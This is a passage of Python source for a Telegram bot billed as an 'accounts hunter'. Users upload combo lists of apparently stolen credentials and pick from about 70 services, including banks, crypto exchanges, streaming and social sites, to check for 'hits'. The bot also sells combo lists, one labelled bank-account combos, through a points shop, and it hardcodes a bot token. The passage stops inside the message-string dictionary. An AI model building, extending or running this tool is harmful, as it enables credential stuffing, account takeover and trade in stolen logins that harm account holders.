import telebot
import requests
import uuid
import re
import time
import threading
import concurrent.futures
import os
import json
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
import urllib3
import zipfile
import tempfile
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8882043243:AAFT29QCWwNIzq2zWbitwIts29x8Q2qyTXo"
bot = telebot.TeleBot(BOT_TOKEN)

MY_SIGNATURE = "@robiulxxxxxxx"
TELEGRAM_CHANNEL = "https://t.me/BlackoutZoneRBX404"
FORCED_CHANNEL = "@BlackoutZoneRBX404"
DEVELOPER_ID = 7294948308

selected_options = {}
check_results = {}
lock = threading.Lock()
combo_list = []
hit = 0
bad = 0
processed = 0
total_combos = 0
service_hits = {}
rate_limit_semaphore = threading.Semaphore(500)
stop_check_flag = {}
turbo_mode = {}
bad_file_attempts = {}
temp_banned_until = {}
pause_check_flag = {}
current_threads = {}

UNLINKED_FILE = f"Unlinked_Accounts_by_{MY_SIGNATURE}.txt"

pending_users = {}
blocked_users = set()
user_language = {}
referral_points = {}
referral_codes = {}

user_purchase_count = {}
user_purchase_weekly = {}
discount_codes = {}
user_daily_bonus = {}
combo_sales_count = {}
user_level = {}
user_gifts = {}
combo_reviews = {}
user_last_points_warning = {}
proxies_list = []
bot_points = 10000

COMBOS_DIR = "UserCombos"
os.makedirs(COMBOS_DIR, exist_ok=True)

def get_combo_list():
    files = []
    for f in os.listdir(COMBOS_DIR):
        if f.endswith('.txt'):
            files.append(f)
    return files

def load_data():
    global blocked_users, selected_options, user_language, referral_points, referral_codes, bad_file_attempts, temp_banned_until
    global user_purchase_count, user_purchase_weekly, discount_codes, user_daily_bonus, combo_sales_count, user_level, user_gifts, combo_reviews, user_last_points_warning, proxies_list, bot_points
    if os.path.exists("blocked_users.json"):
        with open("blocked_users.json", "r", encoding="utf-8") as f:
            blocked_users = set(json.load(f))
    if os.path.exists("selected_options.json"):
        with open("selected_options.json", "r", encoding="utf-8") as f:
            selected_options = json.load(f)
    if os.path.exists("user_language.json"):
        with open("user_language.json", "r", encoding="utf-8") as f:
            user_language = json.load(f)
    if os.path.exists("user_points.json"):
        with open("user_points.json", "r", encoding="utf-8") as f:
            referral_points = json.load(f)
    else:
        referral_points = {}
    if os.path.exists("referral_codes.json"):
        with open("referral_codes.json", "r", encoding="utf-8") as f:
            referral_codes = json.load(f)
    if os.path.exists("bad_file_attempts.json"):
        with open("bad_file_attempts.json", "r", encoding="utf-8") as f:
            bad_file_attempts = json.load(f)
    if os.path.exists("temp_banned_until.json"):
        with open("temp_banned_until.json", "r", encoding="utf-8") as f:
            temp_banned_until = json.load(f)
    if os.path.exists("user_purchase_count.json"):
        with open("user_purchase_count.json", "r", encoding="utf-8") as f:
            user_purchase_count = json.load(f)
    if os.path.exists("user_purchase_weekly.json"):
        with open("user_purchase_weekly.json", "r", encoding="utf-8") as f:
            user_purchase_weekly = json.load(f)
    if os.path.exists("discount_codes.json"):
        with open("discount_codes.json", "r", encoding="utf-8") as f:
            discount_codes = json.load(f)
    if os.path.exists("user_daily_bonus.json"):
        with open("user_daily_bonus.json", "r", encoding="utf-8") as f:
            user_daily_bonus = json.load(f)
    if os.path.exists("combo_sales_count.json"):
        with open("combo_sales_count.json", "r", encoding="utf-8") as f:
            combo_sales_count = json.load(f)
    if os.path.exists("user_level.json"):
        with open("user_level.json", "r", encoding="utf-8") as f:
            user_level = json.load(f)
    if os.path.exists("user_gifts.json"):
        with open("user_gifts.json", "r", encoding="utf-8") as f:
            user_gifts = json.load(f)
    if os.path.exists("combo_reviews.json"):
        with open("combo_reviews.json", "r", encoding="utf-8") as f:
            combo_reviews = json.load(f)
    if os.path.exists("user_last_points_warning.json"):
        with open("user_last_points_warning.json", "r", encoding="utf-8") as f:
            user_last_points_warning = json.load(f)
    if os.path.exists("proxies.json"):
        with open("proxies.json", "r", encoding="utf-8") as f:
            proxies_list = json.load(f)
    if os.path.exists("bot_points.json"):
        with open("bot_points.json", "r", encoding="utf-8") as f:
            bot_points = json.load(f)

def save_data():
    with open("blocked_users.json", "w", encoding="utf-8") as f:
        json.dump(list(blocked_users), f)
    with open("selected_options.json", "w", encoding="utf-8") as f:
        json.dump(selected_options, f)
    with open("user_language.json", "w", encoding="utf-8") as f:
        json.dump(user_language, f)
    with open("user_points.json", "w", encoding="utf-8") as f:
        json.dump(referral_points, f)
    with open("referral_codes.json", "w", encoding="utf-8") as f:
        json.dump(referral_codes, f)
    with open("bad_file_attempts.json", "w", encoding="utf-8") as f:
        json.dump(bad_file_attempts, f)
    with open("temp_banned_until.json", "w", encoding="utf-8") as f:
        json.dump(temp_banned_until, f)
    with open("user_purchase_count.json", "w", encoding="utf-8") as f:
        json.dump(user_purchase_count, f)
    with open("user_purchase_weekly.json", "w", encoding="utf-8") as f:
        json.dump(user_purchase_weekly, f)
    with open("discount_codes.json", "w", encoding="utf-8") as f:
        json.dump(discount_codes, f)
    with open("user_daily_bonus.json", "w", encoding="utf-8") as f:
        json.dump(user_daily_bonus, f)
    with open("combo_sales_count.json", "w", encoding="utf-8") as f:
        json.dump(combo_sales_count, f)
    with open("user_level.json", "w", encoding="utf-8") as f:
        json.dump(user_level, f)
    with open("user_gifts.json", "w", encoding="utf-8") as f:
        json.dump(user_gifts, f)
    with open("combo_reviews.json", "w", encoding="utf-8") as f:
        json.dump(combo_reviews, f)
    with open("user_last_points_warning.json", "w", encoding="utf-8") as f:
        json.dump(user_last_points_warning, f)
    with open("proxies.json", "w", encoding="utf-8") as f:
        json.dump(proxies_list, f)
    with open("bot_points.json", "w", encoding="utf-8") as f:
        json.dump(bot_points, f)

def update_user_level(user_id):
    points = referral_points.get(str(user_id), 0)
    if points < 50:
        level = 1
    elif points < 200:
        level = 2
    else:
        level = 3
    user_level[str(user_id)] = level
    save_data()
    return level

def get_combo_price(user_id):
    points = referral_points.get(str(user_id), 0)
    level = update_user_level(user_id)
    if level == 1:
        price = 20
    elif level == 2:
        price = 18
    else:
        price = 15
    user_id_str = str(user_id)
    if user_id_str in user_purchase_weekly:
        first_purchase = datetime.fromtimestamp(user_purchase_weekly[user_id_str])
        if datetime.now() - first_purchase < timedelta(days=7):
            count = user_purchase_count.get(user_id_str, 0)
            if count >= 3:
                price = min(price, 15)
    return price

def check_low_points_warning(user_id):
    points = referral_points.get(str(user_id), 0)
    last_warning = user_last_points_warning.get(str(user_id), 0)
    if points < 5 and (datetime.now().timestamp() - last_warning) > 86400:
        user_last_points_warning[str(user_id)] = datetime.now().timestamp()
        save_data()
        return True
    return False

services = {
    "Supercell": {"senders": ["noreply@id.supercell.com", "support@supercell.com", "no-reply@supercell.com", "billing@supercell.com"], "file": f"Hits_Supercell_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Ludo": {"senders": ["noreply@gameberrylabs.com", "support@gameberrylabs.com", "billing@gameberrylabs.com", "support@ludoking.com", "noreply@ludoking.com"], "file": f"Hits_Ludo_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "PUBG Mobile": {"senders": ["noreply@pubgmobile.com", "link@pubgmobile.com", "account@pubgmobile.com", "support@pubgmobile.com", "noreply@midasbuy.com", "proxima-billing@tencent.com", "notice@pubgmobile.com"], "file": f"Hits_PUBG_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Twitter": {"senders": ["info@x.com", "noreply@twitter.com", "no-reply@twitter.com", "twitter@twitter.com"], "file": f"Hits_Twitter_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Snapchat": {"senders": ["no-reply@snapchat.com", "support@snapchat.com", "team@snapchat.com", "orders@snapchat.com", "security@snapchat.com"], "file": f"Hits_Snapchat_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Konami": {"senders": ["no-reply@konami.net", "support@konami.net", "noreply@ext.konami.net", "account-noreply@konami.net"], "file": f"Hits_Konami_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Free Fire": {"senders": ["account-security-noreply@garena.com", "noreply@garena.com", "support@garena.com", "no-reply@garena.com"], "file": f"Hits_FreeFire_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Fortnite": {"senders": ["help@acct.epicgames.com", "help@epicgames.com", "noreply@epicgames.com", "accounts@epicgames.com", "support@epicgames.com"], "file": f"Hits_Fortnite_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Facebook": {"senders": ["security@facebookmail.com"], "file": f"Hits_Facebook_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Instagram": {"senders": ["security@mail.instagram.com"], "file": f"Hits_Instagram_by_{MY_SIGNATURE}.txt", "category": "social"},
    "TikTok": {"senders": ["register@account.tiktok.com"], "file": f"Hits_TikTok_by_{MY_SIGNATURE}.txt", "category": "social"},
    "LinkedIn": {"senders": ["security-noreply@linkedin.com"], "file": f"Hits_LinkedIn_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Pinterest": {"senders": ["no-reply@pinterest.com"], "file": f"Hits_Pinterest_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Reddit": {"senders": ["noreply@reddit.com"], "file": f"Hits_Reddit_by_{MY_SIGNATURE}.txt", "category": "social"},
    "VK": {"senders": ["noreply@vk.com"], "file": f"Hits_VK_by_{MY_SIGNATURE}.txt", "category": "social"},
    "WeChat": {"senders": ["no-reply@wechat.com"], "file": f"Hits_WeChat_by_{MY_SIGNATURE}.txt", "category": "social"},
    "WhatsApp": {"senders": ["no-reply@whatsapp.com"], "file": f"Hits_WhatsApp_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Telegram": {"senders": ["telegram.org"], "file": f"Hits_Telegram_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Discord": {"senders": ["noreply@discord.com"], "file": f"Hits_Discord_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Signal": {"senders": ["no-reply@signal.org"], "file": f"Hits_Signal_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Line": {"senders": ["no-reply@line.me"], "file": f"Hits_Line_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Netflix": {"senders": ["info@account.netflix.com"], "file": f"Hits_Netflix_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Spotify": {"senders": ["no-reply@spotify.com"], "file": f"Hits_Spotify_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Twitch": {"senders": ["no-reply@twitch.tv"], "file": f"Hits_Twitch_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "YouTube": {"senders": ["no-reply@youtube.com"], "file": f"Hits_YouTube_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Disney+": {"senders": ["no-reply@disneyplus.com"], "file": f"Hits_DisneyPlus_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Hulu": {"senders": ["account@hulu.com"], "file": f"Hits_Hulu_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "HBO Max": {"senders": ["no-reply@hbomax.com"], "file": f"Hits_HBOMax_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Amazon Prime": {"senders": ["auto-confirm@amazon.com"], "file": f"Hits_AmazonPrime_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Apple TV+": {"senders": ["no-reply@apple.com"], "file": f"Hits_AppleTV_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Crunchyroll": {"senders": ["noreply@crunchyroll.com"], "file": f"Hits_Crunchyroll_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Amazon": {"senders": ["auto-confirm@amazon.com"], "file": f"Hits_Amazon_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "eBay": {"senders": ["newuser@nuwelcome.ebay.com"], "file": f"Hits_eBay_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Shopify": {"senders": ["no-reply@shopify.com"], "file": f"Hits_Shopify_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Etsy": {"senders": ["transaction@etsy.com"], "file": f"Hits_Etsy_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "AliExpress": {"senders": ["no-reply@aliexpress.com"], "file": f"Hits_AliExpress_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Walmart": {"senders": ["no-reply@walmart.com"], "file": f"Hits_Walmart_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "PayPal": {"senders": ["service@paypal.com.br"], "file": f"Hits_PayPal_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Binance": {"senders": ["do-not-reply@ses.binance.com"], "file": f"Hits_Binance_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Coinbase": {"senders": ["no-reply@coinbase.com"], "file": f"Hits_Coinbase_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Revolut": {"senders": ["no-reply@revolut.com"], "file": f"Hits_Revolut_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Venmo": {"senders": ["no-reply@venmo.com"], "file": f"Hits_Venmo_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Cash App": {"senders": ["no-reply@cash.app"], "file": f"Hits_CashApp_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Steam": {"senders": ["noreply@steampowered.com"], "file": f"Hits_Steam_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Xbox": {"senders": ["xboxreps@engage.xbox.com"], "file": f"Hits_Xbox_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "PlayStation": {"senders": ["reply@txn-email.playstation.com"], "file": f"Hits_PlayStation_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Epic Games": {"senders": ["help@acct.epicgames.com"], "file": f"Hits_EpicGames_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "EA Sports": {"senders": ["EA@e.ea.com"], "file": f"Hits_EASports_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Ubisoft": {"senders": ["noreply@ubisoft.com"], "file": f"Hits_Ubisoft_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Riot Games": {"senders": ["no-reply@riotgames.com"], "file": f"Hits_RiotGames_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Valorant": {"senders": ["noreply@valorant.com"], "file": f"Hits_Valorant_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Roblox": {"senders": ["accounts@roblox.com"], "file": f"Hits_Roblox_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Minecraft": {"senders": ["noreply@mojang.com"], "file": f"Hits_Minecraft_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Google": {"senders": ["no-reply@accounts.google.com"], "file": f"Hits_Google_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Microsoft": {"senders": ["account-security-noreply@accountprotection.microsoft.com"], "file": f"Hits_Microsoft_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Apple": {"senders": ["no-reply@apple.com"], "file": f"Hits_Apple_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "GitHub": {"senders": ["noreply@github.com"], "file": f"Hits_GitHub_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Dropbox": {"senders": ["no-reply@dropbox.com"], "file": f"Hits_Dropbox_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Zoom": {"senders": ["no-reply@zoom.us"], "file": f"Hits_Zoom_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Slack": {"senders": ["no-reply@slack.com"], "file": f"Hits_Slack_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "NordVPN": {"senders": ["no-reply@nordvpn.com"], "file": f"Hits_NordVPN_by_{MY_SIGNATURE}.txt", "category": "security"},
    "ExpressVPN": {"senders": ["no-reply@expressvpn.com"], "file": f"Hits_ExpressVPN_by_{MY_SIGNATURE}.txt", "category": "security"},
    "Airbnb": {"senders": ["no-reply@airbnb.com"], "file": f"Hits_Airbnb_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Uber": {"senders": ["no-reply@uber.com"], "file": f"Hits_Uber_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Booking.com": {"senders": ["no-reply@booking.com"], "file": f"Hits_Booking_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Uber Eats": {"senders": ["no-reply@ubereats.com"], "file": f"Hits_UberEats_by_{MY_SIGNATURE}.txt", "category": "food"},
    "DoorDash": {"senders": ["no-reply@doordash.com"], "file": f"Hits_DoorDash_by_{MY_SIGNATURE}.txt", "category": "food"},
    "Anthropic": {"senders": ["noreply@anthropic.com", "support@anthropic.com", "billing@anthropic.com", "notifications@anthropic.com", "privacy@anthropic.com", "info@anthropic.com"], "file": f"Hits_Anthropic_by_{MY_SIGNATURE}.txt", "category": "ai"},
}

additional_services = {
    "Tinder": {"senders": ["no-reply@gotinder.com", "info@gotinder.com"], "file": f"Hits_Tinder_by_{MY_SIGNATURE}.txt", "category": "dating"},
    "OnlyFans": {"senders": ["no-reply@onlyfans.com", "support@onlyfans.com"], "file": f"Hits_OnlyFans_by_{MY_SIGNATURE}.txt", "category": "social"},
    "ChatGPT": {"senders": ["no-reply@openai.com", "support@openai.com"], "file": f"Hits_ChatGPT_by_{MY_SIGNATURE}.txt", "category": "ai"},
    "Canva": {"senders": ["no-reply@canva.com", "support@canva.com"], "file": f"Hits_Canva_by_{MY_SIGNATURE}.txt", "category": "design"},
    "NordPass": {"senders": ["no-reply@nordpass.com", "support@nordpass.com"], "file": f"Hits_NordPass_by_{MY_SIGNATURE}.txt", "category": "security"},
    "Duolingo": {"senders": ["no-reply@duolingo.com", "support@duolingo.com"], "file": f"Hits_Duolingo_by_{MY_SIGNATURE}.txt", "category": "education"},
}
services.update(additional_services)

color_cycle = ['primary', 'success', 'danger']

def get_text(key, user_id):
    lang = user_language.get(user_id, 'bn')  # ডিফল্ট এখন বাংলা
    texts = {
        'welcome_bn': f'''সব ধরনের অ্যাপ ও গেমের অ্যাকাউন্ট সংগ্রহের বটে আপনাকে স্বাগতম 🎯
বটটি সম্পূর্ণ বিনামূল্যে এবং এতে কোনো ত্রুটি নেই।
বটের ডেভেলপার: {MY_SIGNATURE}

📌 শুধু একটি (কম্বো) ফাইল পাঠান, তারপর যাচাই করার জন্য সেবাগুলো নির্বাচন করুন।''',
        'welcome_ar': f'''সব ধরনের অ্যাপ ও গেমের অ্যাকাউন্ট সংগ্রহের বটে আপনাকে স্বাগতম 🎯
বটটি সম্পূর্ণ বিনামূল্যে এবং এতে কোনো ত্রুটি নেই।
বটের ডেভেলপার: {MY_SIGNATURE}

📌 শুধু একটি (কম্বো) ফাইল পাঠান, তারপর যাচাই করার জন্য সেবাগুলো নির্বাচন করুন।''',
        'welcome_en': f'''Welcome to the accounts hunter bot for all programs and games 🎯
The bot is free and has no errors
Bot developer: {MY_SIGNATURE}

📌 Just send a (combo) file then choose the services to check''',
        'file_received_bn': '✅ ফাইলটি গ্রহণ করা হয়েছে। অনুগ্রহ করে যে সেবাগুলো যাচাই করতে চান সেগুলো নির্বাচন করুন:',
        'file_received_ar': '✅ ফাইলটি গ্রহণ করা হয়েছে। অনুগ্রহ করে যে সেবাগুলো যাচাই করতে চান সেগুলো নির্বাচন করুন:',
        'file_received_en': '✅ File received. Please select the services you want to check:',
        'start_check_bn': '✅ ⏳ যাচাই প্রক্রিয়া শুরু করা হচ্ছে...',
        'start_check_ar': '✅ ⏳ যাচাই প্রক্রিয়া শুরু করা হচ্ছে...',
        'start_check_en': '✅ Starting check...',
        'check_complete_bn': '✅ যাচাই সম্পন্ন হয়েছে!',
        'check_complete_ar': '✅ যাচাই সম্পন্ন হয়েছে!',
        'check_complete_en': '✅ Check completed!',
        'no_service_bn': '⚠️ ফাইল পরীক্ষা শুরু করার আগে অনুগ্রহ করে অন্তত একটি সেবা নির্বাচন করুন!',
        'no_service_ar': '⚠️ ফাইল পরীক্ষা শুরু করার আগে অনুগ্রহ করে অন্তত একটি সেবা নির্বাচন করুন!',
        'no_service_en': '⚠️ Please select at least one service before starting the check!',
        'blocked_bn': '🚫 আপনাকে এই বট ব্যবহার করা থেকে নিষিদ্ধ করা হয়েছে।',
        'blocked_ar': '🚫 আপনাকে এই বট ব্যবহার করা থেকে নিষিদ্ধ করা হয়েছে।',
        'blocked_en': '🚫 You are banned from using this bot.',
        'account_bn': '✅ বৈধ অ্যাকাউন্ট (কোনো সংযুক্ত সেবা নেই)',
        'account_ar': '✅ বৈধ অ্যাকাউন্ট (কোনো সংযুক্ত সেবা নেই)',
        'account_en': '✅ Valid account (no linked services)',
        'pending_bn': '⏳ আপনার অনুরোধটি ডেভেলপার দ্বারা পর্যালোচনা করা হচ্ছে...',
        'pending_ar': '⏳ আপনার অনুরোধটি ডেভেলপার দ্বারা পর্যালোচনা করা হচ্ছে...',
        'pending_en': '⏳ Your request is being reviewed by the developer...',
        'rejected_bn': '🚫 আপনার অনুরোধটি প্রত্যাখ্যান করা হয়েছে এবং আপনাকে বট থেকে নিষিদ্ধ করা হয়েছে।',
        'rejected_ar': '🚫 আপনার অনুরোধটি প্রত্যাখ্যান করা হয়েছে এবং আপনাকে বট থেকে নিষিদ্ধ করা হয়েছে।',
        'rejected_en': '🚫 Your request has been rejected and you are banned from the bot.',
        'status_bn': '۝ *স্ক্যানের ফলাফল*\n۩ সক্রিয়: {good}\n۞ অকার্যকর: {bad}',
        'status_ar': '۝ *স্ক্যানের ফলাফল*\n۩ সক্রিয়: {good}\n۞ অকার্যকর: {bad}',
        'status_en': '۝ *Check Results*\n۩ Valid: {good}\n۞ Invalid: {bad}',
        'not_subscribed_bn': f'⚠️বট ব্যবহার করার আগে অনুগ্রহ করে প্রথমে চ্যানেলটিতে যোগ দিন:\n{TELEGRAM_CHANNEL}',
        'not_subscribed_ar': f'⚠️বট ব্যবহার করার আগে অনুগ্রহ করে প্রথমে চ্যানেলটিতে যোগ দিন:\n{TELEGRAM_CHANNEL}',
        'not_subscribed_en': f'⚠️ Please subscribe to the channel first to use the bot:\n{TELEGRAM_CHANNEL}',
        'subscribed_bn': '✅ আপনার সাবস্ক্রিপশন/চ্যানেলে যোগদান সফলভাবে যাচাই করা হয়েছে! পুরস্কার হিসেবে ১০ পয়েন্ট যোগ করা হয়েছে।',
        'subscribed_ar': '✅ আপনার সাবস্ক্রিপশন/চ্যানেলে যোগদান সফলভাবে যাচাই করা হয়েছে! পুরস্কার হিসেবে ১০ পয়েন্ট যোগ করা হয়েছে।',
        'subscribed_en': '✅ Subscribed! 10 points added as a reward.',
        'combo_bank_bn': '📂 *🏦 ব্যাংক অ্যাকাউন্টের কম্বো তালিকা*\nআপনার পয়েন্টসমূহ: {points}\n🛒 আপনি যে কম্বোটি কিনতে চান সেটি নির্বাচন করুন (মূল্য আপনার লেভেল অনুযায়ী নির্ধারিত)।',
        'combo_bank_ar': '📂 *🏦 ব্যাংক অ্যাকাউন্টের কম্বো তালিকা*\nআপনার পয়েন্টসমূহ: {points}\n🛒 আপনি যে কম্বোটি কিনতে চান সেটি নির্বাচন করুন (মূল্য আপনার লেভেল অনুযায়ী নির্ধারিত)।',
        'combo_bank_en': '📂 *Combo Bank*\nYour points: {points}\nChoose combo to buy (price based on your level):',
        'no_combos_bn': '❌ বর্তমানে কোনো কম্বো নেই।',
        'no_combos_ar': '❌ বর্তমানে কোনো কম্বো নেই।',
        'no_combos_en': '❌ No combos available.',
        'combo_added_bn': '✅ কম্বো সফলভাবে যুক্ত হয়েছে। {name} ✅ সফলভাবে সম্পন্ন হয়েছে!',
        'combo_added_ar': '✅ কম্বো সফলভাবে যুক্ত হয়েছে। {name} ✅ সফলভাবে সম্পন্ন হয়েছে!',
        'combo_added_en': '✅ Combo {name} added successfully!',
        'combo_deleted_bn': '✅ কম্বোটি মুছে ফেলা হয়েছে। {name} ✅ সফলভাবে সম্পন্ন হয়েছে!',
        'combo_deleted_ar': '✅ কম্বোটি মুছে ফেলা হয়েছে। {name} ✅ সফলভাবে সম্পন্ন হয়েছে!',
        'combo_deleted_en': '✅ Combo {name} deleted successfully!',
        'delete_combo_bn': '🗑 মুছে ফেলার জন্য কম্বোটি নির্বাচন করুন:',
        'delete_combo_ar': '🗑 মুছে ফেলার জন্য কম্বোটি নির্বাচন করুন:',
        'delete_combo_en': '🗑 Choose combo to delete:',
        'stop_check_bn': '⏹️ আপনার অনুরোধ অনুযায়ী স্ক্যান বন্ধ করা হয়েছে।',
        'stop_check_ar': '⏹️ আপনার অনুরোধ অনুযায়ী স্ক্যান বন্ধ করা হয়েছে।',
        'stop_check_en': '⏹️ Check stopped by your request',
        'referral_info_bn': '🎁 *রেফারেল সিস্টেম*\n🔗 আপনার নিজস্ব রেফারেল লিংক: {link}\nআপনার পয়েন্ট: {points}\nআপনার লিংকের মাধ্যমে যুক্ত প্রতিটি বন্ধু আপনাকে ১০ পয়েন্ট এবং বন্ধুকে ৫ পয়েন্ট দেয়',
        'referral_info_ar': '🎁 *রেফারেল সিস্টেম*\n🔗 আপনার নিজস্ব রেফারেল লিংক: {link}\nআপনার পয়েন্ট: {points}\nআপনার লিংকের মাধ্যমে যুক্ত প্রতিটি বন্ধু আপনাকে ১০ পয়েন্ট এবং বন্ধুকে ৫ পয়েন্ট দেয়',
        'referral_info_en': '🎁 *Referral System*\nYour link: {link}\nYour points: {points}\nEach friend who joins via your link gives you 10 points and the friend gets 5 points',
        'turbo_on_bn': '🚀 টার্বো মোড সক্রিয় (দ্রুত পরীক্ষা)',
        'turbo_on_ar': '🚀 টার্বো মোড সক্রিয় (দ্রুত পরীক্ষা)',
        'turbo_on_en': '🚀 Turbo mode activated (faster checking)',
        'turbo_off_bn': '🐢 সাধারণ মোড সক্রিয়',
        'turbo_off_ar': '🐢 সাধারণ মোড সক্রিয়',
        'turbo_off_en': '🐢 Normal mode activated',
        'premium_account_bn': '⭐ প্রিমিয়াম অ্যাকাউন্ট ({count}টি সেবার সাথে সংযুক্ত)',
        'premium_account_ar': '⭐ প্রিমিয়াম অ্যাকাউন্ট ({count}টি সেবার সাথে সংযুক্ত)',
        'premium_account_en': '⭐ Premium account (linked to {count} services)',
        'temp_banned_bn': '🚫 দুইবার ভুয়া ফাইল পাঠানোর কারণে আপনাকে এক ঘণ্টার জন্য সাময়িকভাবে ব্লক করা হয়েছে',
        'temp_banned_ar': '🚫 দুইবার ভুয়া ফাইল পাঠানোর কারণে আপনাকে এক ঘণ্টার জন্য সাময়িকভাবে ব্লক করা হয়েছে',
        'temp_banned_en': '🚫 You are temporarily banned for one hour due to sending invalid files twice',
        'zip_sent_bn': '📦 ফলাফল জিপ আর্কাইভ হিসেবে পাঠানো হয়েছে',
        'zip_sent_ar': '📦 ফলাফল জিপ আর্কাইভ হিসেবে পাঠানো হয়েছে',
        'zip_sent_en': '📦 Results sent as zip archive',
        'buy_prompt_bn': '💰 *কম্বো ক্রয়*\nকম্বো: {name}\nমূল্য: {price} পয়েন্ট\nআপনার বর্তমান পয়েন্ট: {points}\nআপনি কি এগিয়ে যেতে চান?',
        'buy_prompt_ar': '💰 *কম্বো ক্রয়*\nকম্বো: {name}\nমূল্য: {price} পয়েন্ট\nআপনার বর্তমান পয়েন্ট: {points}\nআপনি কি এগিয়ে যেতে চান?',
        'buy_prompt_en': '💰 *Buy Combo*\nCombo: {name}\nPrice: {price} points\nYour points: {points}\nProceed?',
        'buy_success_bn': '✅ কম্বো সফলভাবে কেনা হয়েছে! {price} পয়েন্ট কেটে নেওয়া হয়েছে।\nআপনার অবশিষ্ট পয়েন্ট: {points}',
        'buy_success_ar': '✅ কম্বো সফলভাবে কেনা হয়েছে! {price} পয়েন্ট কেটে নেওয়া হয়েছে।\nআপনার অবশিষ্ট পয়েন্ট: {points}',
        'buy_success_en': '✅ Combo purchased successfully! {price} points deducted.\nRemaining points: {points}',
        'buy_fail_points_bn': '❌ এই কম্বো কেনার জন্য আপনার কাছে পর্যাপ্ত পয়েন্ট নেই।\nআপনার পয়েন্ট: {points}\nমূল্য: {price} পয়েন্ট',
        'buy_fail_points_ar': '❌ এই কম্বো কেনার জন্য আপনার কাছে পর্যাপ্ত পয়েন্ট নেই।\nআপনার পয়েন্ট: {points}\nমূল্য: {price} পয়েন্ট',
        'buy_fail_points_en': '❌ You don\'t have enough points to buy this combo.\nYour points: {points}\nPrice: {price} points',
        'points_bn': '💰 *আপনার বর্তমান পয়েন্ট:* {points}\n📊 *আপনার লেভেল:* {level}',
        'points_ar': '💰 *আপনার বর্তমান পয়েন্ট:* {points}\n📊 *আপনার লেভেল:* {level}',
        'points_en': '💰 *Your current points:* {points}\n📊 *Your level:* {level}',
        'gift_prompt_bn': '🎁 *কম্বো উপহার দাও*\nযে ইউজার আইডিকে আপনি কম্বোটি উপহার দিতে চান তা লিখুন:',
        'gift_prompt_ar': '🎁 *কম্বো উপহার দাও*\nযে ইউজার আইডিকে আপনি কম্বোটি উপহার দিতে চান তা লিখুন:',
        'gift_prompt_en': '🎁 *Gift Combo*\nEnter the user ID you want to gift this combo to:',
        'gift_success_bn': '🎁 {name} কম্বোটি {target} ইউজারকে সফলভাবে উপহার দেওয়া হয়েছে!',
        'gift_success_ar': '🎁 {name} কম্বোটি {target} ইউজারকে সফলভাবে উপহার দেওয়া হয়েছে!',
        'gift_success_en': '🎁 Combo {name} gifted to user {target} successfully!',
        'gift_fail_bn': '❌ উপহার দিতে ব্যর্থ: ইউজার বিদ্যমান নেই অথবা ত্রুটি ঘটেছে।',
        'gift_fail_ar': '❌ উপহার দিতে ব্যর্থ: ইউজার বিদ্যমান নেই অথবা ত্রুটি ঘটেছে।',
        'gift_fail_en': '❌ Gift failed: user not found or error occurred.',
        'review_prompt_bn': '⭐ *কম্বো রেটিং দিন*\n{name} কম্বোটি ১ থেকে ৫ তারকা পর্যন্ত রেটিং দিন:\n(১ থেকে ৫ এর মধ্যে একটি সংখ্যা পাঠান)',
